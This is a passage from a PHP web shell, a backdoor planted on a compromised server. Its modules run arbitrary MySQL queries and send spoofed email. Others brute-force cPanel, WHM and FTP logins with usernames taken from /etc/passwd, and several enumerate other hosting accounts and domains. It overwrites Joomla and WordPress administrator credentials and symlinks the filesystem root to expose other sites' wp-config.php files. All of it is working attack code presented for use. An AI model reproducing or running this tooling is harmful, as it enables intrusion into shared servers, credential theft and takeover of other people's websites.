											if($rows[$j] == "") $dataz = "&nbsp;"; 
											else $dataz = $rows[$j]; 
											$msg .= "<td>".$dataz."</td>"; 
											} 
										$msg .= "</tr>"; 
										} 
									$msg .= "</table>"; 
									} 
								else 
									$msg .= "<p style=\"padding:0;margin:20px 6px 0 6px;\">".$query.";&nbsp;&nbsp;&nbsp;<span class=\"gaya\">[</span> error <span class=\"gaya\">]</span></p>"; 
								} 
							} 
						} 
					else 
						{ 
						$query = "SHOW PROCESSLIST;\n
							SHOW VARIABLES;\n
							SHOW STATUS;"; 
						$msg = "<div style=\"width:99%;padding:0 10px;\">
							<form action=\"?\" method=\"get\"> 
								<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
								<input type=\"hidden\" name=\"x\" value=\"mysql\" /> 
								<input type=\"hidden\" name=\"sqlhost\" value=\"".$sqlhost."\" /> 
								<input type=\"hidden\" name=\"sqluser\" value=\"".$sqluser."\" /> 
								<input type=\"hidden\" name=\"sqlport\" value=\"".$sqlport."\" /> 
								<input type=\"hidden\" name=\"sqlpass\" value=\"".$sqlpass."\" /> 
								<input type=\"hidden\" name=\"db\" value=\"".$db."\" /> 
								<p><textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\">".$query."</textarea></p> 
								<p><input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go\" /></p> 
							</form>
							</div> "; 
						$dbs = array(); 
						$msg .= "<table class=\"explore\" style=\"width:99%;\"><tr><th>available databases</th></tr>"; 
						$hasil = @mysql_list_dbs($con); 
						while(list($db) = @mysql_fetch_row($hasil)){ @array_push($dbs,$db); } 
						@sort($dbs); 
						foreach($dbs as $db)
							{
							$msg .= "<tr><td><a href=\"?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."\">$db</a></td></tr>"; 
							} 
						$msg .= "</table>"; 
						} 
					@mysql_close($con); 
					} 
				else $msg = "<p style=\"text-align:center;\">cant connect to mysql server</p>"; 
				echo $msg; 
				} 
			else
				{ 
				?> 
				<form action="?" method="get"> 
				<input type="hidden" name="y" value="<?php echo $pwd; ?>" /> 
				<input type="hidden" name="x" value="mysql" /> 
				<table class="tabnet" style="width:300px;"> 
					<tr>
						<th colspan="2">Connect to mySQL server</th>
					</tr> 
					<tr>
						<td>&nbsp;&nbsp;Host</td>
						<td><input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td>
					</tr>
					<tr>
						<td>&nbsp;&nbsp;Username</td>
						<td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td>
					</tr> 
					<tr>
						<td>&nbsp;&nbsp;Password</td>
						<td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /></td>
					</tr> 
					<tr>
						<td>&nbsp;&nbsp;Port</td>
						<td><input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" />&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /></td>
					</tr>
				</table>
				</form> 
				<?php 
				}
			} 
		elseif(isset($_GET['x']) && ($_GET['x'] == 'mail'))
			{ 
			if(isset($_POST['mail_send']))
				{ 
				$mail_to = $_POST['mail_to']; 
				$mail_from = $_POST['mail_from']; 
				$mail_subject = $_POST['mail_subject']; 
				$mail_content = magicboom($_POST['mail_content']); 
				if(@mail($mail_to,$mail_subject,$mail_content,"FROM:$mail_from"))
					{ $msg = "email sent to $mail_to"; } 
				else $msg = "send email failed"; 
				} 
			?> 
			<form action="?y=<?php echo $pwd; ?>&amp;x=mail" method="post"> 
				<table class="cmdbox"> 
					<tr>
						<td> 
							<textarea class="output" name="mail_content" id="cmd" style="height:340px;">Hey admin, please patch your site :)</textarea> 
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;<input class="inputz" style="width:20%;" type="text" value="admin@somesome.com" name="mail_to" />&nbsp; mail to
						</td>
					</tr> 
					<tr>
						<td>	
							&nbsp;<input class="inputz" style="width:20%;" type="text" value="Newbie3viLc063s0@fbi.gov" name="mail_from" />
							&nbsp; from
						</td>
					</tr> 
					<tr>
						<td>
							&nbsp;<input class="inputz" style="width:20%;" type="text" value="patch me" name="mail_subject" />&nbsp; subject
						</td>
					</tr> 
					<tr>
						<td>
							&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="mail_send" />
						</td>
					</tr>
					<tr>
						<td>&nbsp;&nbsp;&nbsp;&nbsp;<?php echo $msg; ?>
						</td>
					</tr> 
				</table> 
			</form> 
			<?php 
			} 
		elseif(isset($_GET['x']) && ($_GET['x'] == 'brute'))
			{	
			?>
				<form action="?y=<?php echo $pwd; ?>&amp;x=brute" method="post">
			<?php
			//bruteforce
			@ini_set('memory_limit', 999999999999);
			$connect_timeout=5;
			@set_time_limit(0);
			$pokeng 	= $_REQUEST['submit'];
			$hn 		= $_REQUEST['users'];
			$crew 		= $_REQUEST['passwords'];
			$pasti 		= $_REQUEST['sasaran'];
			$manualtarget 	= $_REQUEST['target'];
			$bisa 		= $_REQUEST['option'];
			if($pasti == ''){
				$pasti = 'localhost';
			}
			if($manualtarget == ''){
				$manualtarget = 'http://localhost:2082';
			}

function get_users()
{
	$users = array();
	$rows=file('/etc/passwd');
	if(!$rows) return 0;	
	foreach ($rows as $string)
	{
		$user = @explode(":",$string);
		if(substr($string,0,1)!='#') array_push($users,$user[0]);
	}
	return $users; 
}

if(!$users=get_users()) { echo "<center><font face=Verdana size=-2 color=red>".$lang[$language.'_text96']."</font></center>"; }
else 
	{ 
	print " <div align='center'>
		<form method='post' style='border: 1px solid #000000'><br><br>
		<TABLE style='BORDER-COLLAPSE: collapse' cellSpacing=0 borderColorDark=#666666 cellPadding=5 width='40%' bgColor=#303030 borderColorLight=#666666 border=1>
			<tr>
				<td>
					<b> Target ! : </font><input type='text' name='sasaran' size='16' value= $pasti class='inputz'></p></font></b></p>
					<div align='center'><br>
					<TABLE style='BORDER-COLLAPSE: collapse' 
						cellSpacing=0 
						borderColorDark=#666666 
						cellPadding=5 width='50%' bgColor=#303030 borderColorLight=#666666 border=1>
						<tr> <td align='center'> <b>User</b></td> <td> <p align='center'> <b>Pass</b></td>
						</tr>
					</table>
					<p align='center'>
					<textarea rows='20' name='users' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0' >";
	foreach($users as $user) { echo $user."\n"; } 
	print"</textarea>
		<textarea rows='20' name='passwords' cols='25' style='border: 2px solid #1D1D1D; background-color: #000000; color:#C0C0C0'>$crew</textarea><br>
		<br> 
		<b>Sila pilih : </span><input name='option' value='manual' style='font-weight: 700;' type='radio'> Manual Target Brute : <input type='text' name='target' size='16' class='inputz' value= $manualtarget ><br /> 
		<input name='option' value='cpanel' style='font-weight: 700;' checked type='radio'> cPanel 
		<input name='option' value='ftp' style='font-weight: 700;' type='radio'> ftp 
		<input name='option' value='whm' style='font-weight: 700;' type='radio'> whm ==> <input type='submit' value='Brute !' name='submit' class='inputzbut'></p>
		</td></tr></table></td></tr></form><p align= 'left'>";
	}
?>
<?php

function manual_check($anjink,$asu,$babi,$lonte){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "$anjink");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, "$asu:$babi");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $lonte);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit;}
	elseif ( curl_errno($ch) == 0 ){
		print "<b>[ Newbie3viLc063s0@email ]# </b> <b>Completed , Username = <font color='#FF0000'> $asu </font> Password = <font color='#FF0000'> $babi </font></b><br>";
		}
	curl_close($ch);
}


function ftp_check($link,$user,$pswd,$timeout){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "ftp://$link");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
	curl_setopt($ch, CURLOPT_USERPWD, "$user:$pswd");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit; }
	elseif ( curl_errno($ch) == 0 ){
		print "<b>serangan selesai , username = <font color='#FF0000'> $user </font> dan passwordnya = <font color='#FF0000'> $pswd </font></b><br>";
		}
	curl_close($ch);
}

function cpanel_check($anjink,$asu,$babi,$lonte){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://$anjink:2082");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, "$asu:$babi");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $lonte);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit;}
	elseif ( curl_errno($ch) == 0 ){
		print "<b>[ Newbie3viLc063s@email ]# </b> <b>Completed, Username = <font color='#FF0000'> $asu </font> Password = <font color='#FF0000'> $babi </font></b><br>";
		}
	curl_close($ch);
}

function whm_check($anjink,$asu,$babi,$lonte){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "http://$anjink:2086");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	curl_setopt($ch, CURLOPT_USERPWD, "$asu:$babi");
	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $lonte);
	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	$data = curl_exec($ch);
	if ( curl_errno($ch) == 28 ) { print "<b> Failed! : NEXT TARGET!</b>"; exit;}
	elseif ( curl_errno($ch) == 0 )
		{
		print "<b>[ " . TITLE . " ]# </b> <b>Selesai , Username = <font color='#FF0000'> $asu </font> Password = <font color='#FF0000'> $babi </font></b><br>";
		}
	curl_close($ch);
}
	
if(isset($pokeng) && !empty($pokeng))
	{
	$userlist = explode ("\n" , $hn );
	$passlist = explode ("\n" , $crew );
	print "<b>[ " . TITLE . "  ]# </b> ATTACK...!!! </font></b><br>";
	foreach ($userlist as $asu) 
		{
		$_user = trim($asu);
		foreach ($passlist as $babi ) 
			{
			$_pass = trim($babi);
			if ($bisa == "manual")
				{ manual_check($manualtarget,$_user,$_pass,$lonte); }
			if($bisa == "ftp")
				{ ftp_check($pasti,$_user,$_pass,$lonte); }
			if ($bisa == "cpanel")
				{ cpanel_check($pasti,$_user,$_pass,$lonte); }
			if ($bisa == "whm")
				{ whm_check($pasti,$_user,$_pass,$lonte); }
			}
		}
	}
}

//bruteforce

elseif(isset($_GET['x']) && ($_GET['x'] == 'readable'))
	{	
	?>
	<form action="?y=<?php echo $pwd; ?>&amp;x=readable" method="post">
	<?php

	//radable public_html
	echo '<html><head><title>Newbie3viLc063s Cpanel Finder</title></head><body>';
	($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
	set_time_limit(0);
	###################
	@$passwd = fopen('/etc/passwd','r');
	if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
	$pub = array();
	$users = array();
	$conf = array();
	$i = 0;
	while(!feof($passwd))
	{
		$str = fgets($passwd);
		if ($i > 35)
			{
			$pos = strpos($str,':');
			$username = substr($str,0,$pos);
			$dirz = '/home/'.$username.'/public_html/';
			if (($username != ''))
				{
				if (is_readable($dirz))
					{
					array_push($users,$username);
					array_push($pub,$dirz);
					}
				}
			}
		$i++;
	}
	
	###################
	echo '<br><br>';
	echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n"."<br />";
	echo "[+] Founded ".sizeof($pub)." readable public_html directories\n"."<br />";
	echo "[~] Searching for passwords in config files...\n\n"."<br /><br /><br />";
	foreach ($users as $user)
		{
		$path = "/home/$user/public_html/";
		echo "<a href='?y&#61;$path' target='_blank' style='text-shadow:0px 0px 10px #12E12E; font-weight:bold; color:#FF0000;'>$path</a><br>";
		}
	echo "<br><br><br>";
	echo "[+] Copy one of the directories above public_html, then Paste to -> view file / folder <-- that's on the menu --> Explore \n"."<br />";
	echo "[+] Complete...\n"."<br />";
	echo '<br><br></b>
	</body>
	</html>';
    
	}

	
elseif(isset($_GET['x']) && ($_GET['x'] == 'localdomain'))
	{	
	?>
	<form action="?y=<?php echo $pwd; ?>&amp;x=localdomain" method="post">
	<?php

	//readable public_html
	
	echo "<br><br>";
	$file = @implode(@file("/etc/named.conf"));
	if(!$file){ die("# can't ReaD -> [ /etc/named.conf ]"); }
	preg_match_all("#named/(.*?).db#",$file ,$r);
	$domains = array_unique($r[1]);
	
	function check() { (@count(@explode('ip',@implode(@file(__FILE__))))==a) ?@unlink(__FILE__):""; }
	
	check();
	
	echo "<table align=center border=1 width=59% cellpadding=5>
	         <tr><td colspan=2>[+] Here We Have : [<font face=calibri size=4 style=color:#FF0000>".count($domains)."</font>] Listed Domains In localhost.</td></tr>
	         <tr>
			 <td><b>List Of Users</b></td>
			 <td><b><font style=color:#0015FF;>List Of Domains</b></td>
			 </tr>";
	
	foreach($domains as $domain)
	       {
	       $user = posix_getpwuid(@fileowner("/etc/valiases/".$domain));
	       echo "<tr>
		   <td><a href='http://www.$domain' target='_blank' style='text-shadow:0px 0px 10px #CC2D4B; font-weight:bold; color:#FF002F;'>$domain</a></td>
		   <td>".$user['name']."</td>
		   </tr>";
	       }
	
	echo "</table>";
	//radable public_html
	}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'port-scanner'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=port-scanner" method="post">
 <?php

echo '<br><br><center><br><b>Port Scanner</b><br>';
$start = strip_tags($_POST['start']);
$end = strip_tags($_POST['end']);
$host = strip_tags($_POST['host']);
 
if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
for($i = $start; $i<=$end; $i++){
        $fp = @fsockopen($host, $i, $errno, $errstr, 3);
        if($fp){
                echo "Port <font style='color:#DE3E3E'>$i</font> is <font style='color:#64CF40'>open</font><br>";
        }
        flush();
        }
}else{

echo '
<input type="hidden" name="y" value="phptools">
Host:<br />
<input type="text" style="color:#FF0000;background-color:#000000" name="host" value="localhost"/><br />
Port start:<br />
<input type="text" style="color:#FF0000;background-color:#000000" name="start" value="0"/><br />
Port end:<br />
<input type="text" style="color:#FF0000;background-color:#000000" name="end" value="5000"/><br />
<input type="submit" style="color:#FF0000" value="Scan Ports" />
</form></center>';
}
	}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'string-encode'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=string-encode" method="post">
<?php

/*
  Simple STRING TO HASH 
  Code by Altenator IWnet
*/

echo "<center><br><br><form method='post'>
Insert STRING Here : <input type='text' style='color:#FF0000;background-color:#000000' name='hash_input' value='' /><br><br>
<input type='submit' name='submit_hash' style='color:#FF0000;background-color:#000000' value='Encode' /><br><br>";

if (isset($_POST['submit_hash'])) {
	if (isset($_POST['hash_input'])) {
		$hash_input = $_POST['hash_input'];
		}

if ($hash_input=="") {  // show error if nothing inserted in input box
	echo 'Nothing Inserted!';
} else {
	if (isset($hash_input)) {
		foreach (hash_algos() as $hash_setoption) {    // set to use all hash function
		$calculate_hash = hash($hash_setoption, $hash_input, false); // calculate all hash and declare variable
		echo "<table border='1'><tbody>";
		echo "<tr><th><font style='color:#9F7CEB'>$hash_setoption</font></th><th><font style='color:#5BC740'>$calculate_hash</font></th></tr>";   // output
	}
	}
	echo '</tbody></table></center>';
}
}
}

elseif(isset($_GET['x']) && ($_GET['x'] == 'cms-scanner'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=cms-scanner" method="post">

<?php

function ask_exploit_db($component){

$exploitdb ="http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$component&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";

$result = @file_get_contents($exploitdb);

if (eregi("No results",$result))  {

echo"<td>Not Found</td><td><a href='http://www.google.com/search?hl=en&q=download+$component'>Download</a></td></tr>";

}else{

echo"<td><a href='$exploitdb'>Found ..!</a></td><td><--</td></tr>";

}
}

/**************************************************************/
/* Joomla Conf */

function get_components($site){

$source = @file_get_contents($site);

preg_match_all('{option,(.*?)/}i',$source,$f);
preg_match_all('{option=(.*?)(&amp;|&|")}i',$source,$f2);
preg_match_all('{/components/(.*?)/}i',$source,$f3);

$arz=array_merge($f2[1],$f[1],$f3[1]);

$coms=array();

if(count($arz)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach(array_unique($arz) as $x){

$coms[]=$x;
}

foreach($coms as $comm){

echo "<tr><td>$comm</td>";

ask_exploit_db($comm);

}

}

/**************************************************************/
/* WP Conf */

function get_plugins($site){

$source = @file_get_contents($site);

preg_match_all("#/plugins/(.*?)/#i", $source, $f);

$plugins=array_unique($f[1]);

if(count($plugins)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach($plugins as $plugin){

echo "<tr><td>$plugin</td>";

ask_exploit_db($plugin);

}

}

/**************************************************************/
/* Nuke's Conf */

function get_numod($site){

$source = @file_get_contents($site);

preg_match_all('{?name=(.*?)/}i',$source,$f);
preg_match_all('{?name=(.*?)(&amp;|&|l_op=")}i',$source,$f2);
preg_match_all('{/modules/(.*?)/}i',$source,$f3);

$arz=array_merge($f2[1],$f[1],$f3[1]);

$coms=array();

if(count($arz)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach(array_unique($arz) as $x){

$coms[]=$x;
}

foreach($coms as $nmod){

echo "<tr><td>$nmod</td>";

ask_exploit_db($nmod);

}

}

/*****************************************************/
/* Xoops Conf */

function get_xoomod($site){

$source = @file_get_contents($site);

preg_match_all('{/modules/(.*?)/}i',$source,$f);

$arz=array_merge($f[1]);

$coms=array();

if(count($arz)==0){ echo "<tr><td colspan=3>[~] Nothing Found ..! , Maybe there is some error site or option ... check it .</td></tr>";}

foreach(array_unique($arz) as $x){

$coms[]=$x;
}

foreach($coms as $xmod){

echo "<tr><td>$xmod</td>";

ask_exploit_db($xmod);

}

}

/**************************************************************/
 /* Header */
function t_header($site){

echo'<table align="center" border="1" width="50%" cellspacing="1" cellpadding="5">';

echo'
<tr id="oo">
<td>Site : <a href="'.$site.'">'.$site.'</a></td>
<td>Exploit-db</b></td>
<td>Exploit it !</td>
</tr>
';

}

?>
<html>

<body>

<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<p align="center">&nbsp;</p>
<form method="POST" action="">
	<p align="center">&nbsp;
	</p>
	<p align="center">
	<font size="4"><br></font></p>
	<p align="center">Site :
	<input type="text" name="site" size="33" style="color:#FF0000;background-color:#000000" value="http://www.site.com/"><select style="color:#FF0000;background-color:#000000" size="1" name="what">
	<option>Wordpress</option>
	<option>Joomla</option>
	<option>Nuke's</option>
	<option>Xoops</option>
	</select><input style="color:#FF0000;background-color:#000000" type="submit" value="Scan"></p>
</form>
<?

// Start Scan :P :P ...

if($_POST){

$site=strip_tags(trim($_POST['site']));

t_header($site);

echo $x01 = ($_POST['what']=="Wordpress") ? get_plugins($site):"";
echo $x02 = ($_POST['what']=="Joomla") ? get_components($site):"";
echo $x03 = ($_POST['what']=="Nuke's") ? get_numod($site):"";
echo $x04 = ($_POST['what']=="Xoops") ? get_xoomod($site):"";
echo '</table></body></html>';

}
}
	

elseif(isset($_GET['x']) && ($_GET['x'] == 'jm-reset'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=jm-reset" method="post">

<?php

@error_reporting(0);
@ini_set('error_log',NULL);
echo '
<div class="com">
<form method="post">
<center><br><br><table border="1" bordercolor="#FFFFFF" width="400" cellpadding="1" cellspacing="1">
 <br />
<tr>
     <td>Host :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="host" value="localhost" /></td>
</tr>
<tr>
     <td>user :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="user" /></td>
</tr>
<tr>
     <td>Pass :</td><td><input style="color:#FF0000;background-color:#000000" type="text" name="pass"/></td>
</tr>
<tr>
     <td>db :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="db" /></td>
</tr>
<tr>
     <td>dbprefix :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="jop" value="jos_users" /></td>
</tr>
<tr>
     <td>Admin User :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="users" value="useradmin" /></td>
</tr>
<tr>
     <td>Admin Password :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="passwd" value="passadmin" /></td>
</tr>
<tr>
      <td colspan="6" align="center" style="color:#FF0000;background-color:#000000" width="70%"> <input type="submit" value="SQL" style="color:#FF0000;background-color:#000000" maxlength="30" />  <input type="reset" value="clear" style="color:#FF0000;background-color:#000000" maxlength="30" /> </td>

</tr>
  </table>
 </form> </div></center>';

$host   = $_POST['host'];
$user   = $_POST['user'];
$pass   = $_POST['pass'];
$db     = $_POST['db'];
$jop    = $_POST['jop'];
$users   = $_POST['users'];
$admpas = $_POST['passwd'];

function joomlahash($password) {
	$random = rand();
	$string = md5("$random");
	$yourpassword = "$password";
	$random32 = "$string";
	$join = "$password$random32";
	$md5 = md5("$join");
	$jomlaahash = "$md5:$random32";
	return $jomlaahash;
}

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$cond =@ mysql_select_db($db) or die;

$query =@mysql_query("UPDATE $jop SET username ='".$users."' WHERE usertype = Super Administrator");
$query =@mysql_query("UPDATE $jop SET password ='".joomlahash($admpas)."' WHERE usertype = Super Administrator");
$query =@mysql_query("UPDATE $jop SET username ='".$users."' WHERE usertype = deprecated");
$query =@mysql_query("UPDATE $jop SET password ='".joomlahash($admpas)."' WHERE usertype = deprecated");

}else{
  echo "<center><br /><div class='com'>Enter the database !<br /><br /></div></center>";
}
}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'wp-reset'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=wp-reset" method="post">

<?php

@error_reporting(0);
@ini_set('error_log',NULL);
  echo '
<div class="com">
<form method="post">
<center><br><br><table border="1" bordercolor="#FFFFFF" width="400" cellpadding="1" cellspacing="1">
 <br />

<tr>
     <td>Host :</td>
     <td><input type="text" name="host" style="color:#FF0000;background-color:#000000" value="localhost" /></td>
</tr>

<tr>
     <td>user :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="user" /></td>
</tr>
<tr>
     <td>Pass :</td><td><input type="text" style="color:#FF0000;background-color:#000000" name="pass"/></td>
</tr>
<tr>
     <td>db :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="db" /></td>
</tr>
<tr>
     <td>user admin :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="useradmin" value="admin" /></td>
</tr>
<tr>
     <td>pass admin :</td>
     <td><input type="text" style="color:#FF0000;background-color:#000000" name="passadmin" value="admin"/></td>
</tr>
<tr>
      <td colspan="6" align="center" width="70%"> <input type="submit" style="color:#FF0000;background-color:#000000" value="SQL" maxlength="30" />  <input type="reset" value="clear" style="color:#FF0000;background-color:#000000" maxlength="30" /> </td>

</tr>
  </table>
 </form> </div></center>';

$host       = $_POST['host'];
$user       = $_POST['user'];
$pass       = $_POST['pass'];
$db         = $_POST['db'];
$useradmin  = $_POST['useradmin'];
$pass_ad    = $_POST['passadmin'];

if(isset($host) ) {
$con =@ mysql_connect($host,$user,$pass) or die ;
$sedb =@ mysql_select_db($db) or die;
$crypt = crypt($pass_ad);
$query =@mysql_query("UPDATE `wp_users` SET `user_login` ='".$useradmin."' WHERE ID = 1") or die('Cant Update ID Number 1');
$query =@mysql_query("UPDATE `wp_users` SET `user_pass` ='".$crypt."' WHERE ID = 1") or die('Cant Update ID Number 1');
if ($query)
{
  echo "<center><br /><div class='com'>Queried !<br /><br /></div></center>";
}
else if (!$query)
{
  echo "error";
}

}else
{
  echo "<center><br /><div class='com'>Enter the database !<br /><br /></div></center>";
}
}
	
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'web-info'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=web-info" method="post">


<?php
@set_time_limit(0);
@error_reporting(0);

function sws_domain_info($site)
{
$getip = @file_get_contents("http://networktools.nl/whois/$site");
flush();
$ip    = @findit($getip,'<pre>','</pre>');

return $ip;
flush();
}


function sws_net_info($site)
{
$getip = @file_get_contents("http://networktools.nl/asinfo/$site");
$ip    = @findit($getip,'<pre>','</pre>');

return $ip;
flush();
}

function sws_site_ser($site)
{
$getip = @file_get_contents("http://networktools.nl/reverseip/$site");
$ip    = @findit($getip,'<pre>','</pre>');

return $ip;
flush();
}

function sws_sup_dom($site)
{
$getip = @file_get_contents("http://www.magic-net.info/dns-and-ip-tools.dnslookup?subd=".$site."&Search+subdomains=Find+subdomains");
$ip    = @findit($getip,'<strong>Nameservers found:</strong>','<script type="text/javascript">');

return $ip;
flush();
}

function sws_port_scan($ip)
{

$list_post = array('80','21','22','2082','25','53','110','443','143');

foreach ($list_post as $o_port)
{
$connect = @fsockopen($ip,$o_port,$errno,$errstr,5);

           if($connect)
           {
           echo " $ip : $o_port    &nbsp;&nbsp;&nbsp; <u style=\"color: #009900\">Open</u> <br /><br />";
           flush();
           }
}

}

function findit($mytext,$starttag,$endtag) {
 $posLeft  = @stripos($mytext,$starttag)+strlen($starttag);
 $posRight = @stripos($mytext,$endtag,$posLeft+1);
 return  @substr($mytext,$posLeft,$posRight-$posLeft);
 flush();
}

echo '<br><br><center>';


echo '
<br />
<div class="sc"><form method="post">
Site to scan : <input type="text" name="site" size="30" style="color:#FF0000;background-color:#000000" value="site.com"   /> &nbsp;&nbsp <input type="submit" style="color:#FF0000;background-color:#000000" name="scan" value="Scan !"  />
</form></div>';


if(isset($_POST['scan']))
{




$site =  @htmlentities($_POST['site']);
                 if (empty($site)){die('<br /><br /> Not add IP .. !');}

$ip_port = @gethostbyname($site);

echo "





<br /><div class=\"sc2\">Scanning [ $site ip $ip_port ] ... </div>

<div class=\"tit\"> <br /><br />|-------------- Port Server ------------------| <br /></div>
<div class=\"ru\"> <br /><br /><pre>
";
echo "".sws_port_scan($ip_port)." </pre></div> ";

flush();



echo "<div class=\"tit\"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
<div class=\"ru\">
<pre>".sws_domain_info($site)."</pre></div>";
flush();

echo "
<div class=\"tit\"> <br /><br />|-------------- Network Info ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_net_info($site)."</pre> </div>";
flush();

echo "<div class=\"tit\"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_sup_dom($site)."</pre> </div>";
flush();


echo "<div class=\"tit\"> <br /><br />|-------------- Site Server ------------------| <br /></div>
<div class=\"ru\">
<pre>".sws_site_ser($site)."</pre> </div>
<div class=\"tit\"> <br /><br />|-------------- END ------------------| <br /></div>";
flush();





}

echo '</center>';
}
	
elseif(isset($_GET['x']) && ($_GET['x'] == 'identify'))
{	
?>
<form action="?y=<?php echo $pwd; ?>&amp;x=identify" method="post">

<?php

echo "<center><br><br>
<font style=\"color:#FF0000\">This function is used to identify some CMS on all website in this server</font><br>
<font style=\"color:#FF0000\">may take very long time and this shell gonna lag, if you want to continue, press \"Check Now\" button</font><br><br>
<form type=post>
<input type='submit' style=\"color:#FF0000\" value='Check Now' name='checkingstart'>
</form></center>";

if (isset($_POST['checkingstart'])) {

echo "<center>";

$WebUrl = 'http://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$Explode=explode('/',$WebUrl );
$WebUrl =str_replace($Explode[count($Explode)-1],'',$WebUrl );


@mkdir('sym',0777);
$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);

$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
die (" can't read /etc/named.conf,Please use <a href='?vvip=sytc'>/etc Symlink</a>");
}
$new12 = explode (', ', $dis_func);
if (in_array('posix_getpwuid', $new12)){die('<center><b># posix_getpwuid is Not Supported</b></center>');}
else
{
echo "<div class='tmp'>
<table border='1' bordercolor='#FF0000' width='500' cellpadding='1' cellspacing='0'><td> Domains </td><td> Script </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$Wordpress=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/wp-config.php';
$wp=get_headers($Wordpress);
$haystackwp=$wp[0];
$Wordpress2=$WebUrl.'/sym/root/home/'.$UID['name'].'/public_html/blog/wp-config.php';
$wp2=get_headers($Wordpress2);
